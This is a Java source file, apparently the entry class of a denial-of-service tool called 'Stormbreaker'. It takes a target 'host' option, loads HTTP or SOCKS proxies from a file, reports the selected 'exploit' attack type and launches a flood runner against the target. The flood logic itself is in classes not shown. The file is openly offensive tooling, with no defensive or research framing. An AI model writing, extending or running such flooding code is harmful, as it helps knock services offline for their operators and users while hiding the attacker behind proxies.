package me.michaeldevc;

import me.michaeldevc.flood.FloodRunner;
import me.michaeldevc.option.Options;
import me.michaeldevc.proxy.Proxies;

import java.net.Proxy;

public class Stormbreaker {
    private final Options options;

    public Stormbreaker(Options options) {
        this.options = options;
    }

    public void launch() {
        if (!this.options.isOption("host")) {
            System.out.println("No \"host\" option provided!");
        } else {
            String proxiesType = (String)this.options.getOption("proxiesType", "http");
            String proxiesFile = (String)this.options.getOption("proxiesFile", "proxies.txt");
            Proxies proxies = new Proxies();

            try {
                if (proxiesType.equalsIgnoreCase("socks")) {
                    proxies.init(proxiesFile, Proxy.Type.SOCKS);
                } else {
                    proxies.init(proxiesFile, Proxy.Type.HTTP);
                }
            } catch (Exception var5) {
                System.out.println("Couldn't init proxies instance!");
                return;
            }

            System.out.println();
            System.out.println("Proxies: " + proxies.size());
            System.out.println("Attack: " + (String)this.options.getOption("exploit", "1"));
            (new FloodRunner(this.options, proxies)).run();
        }
    }
}
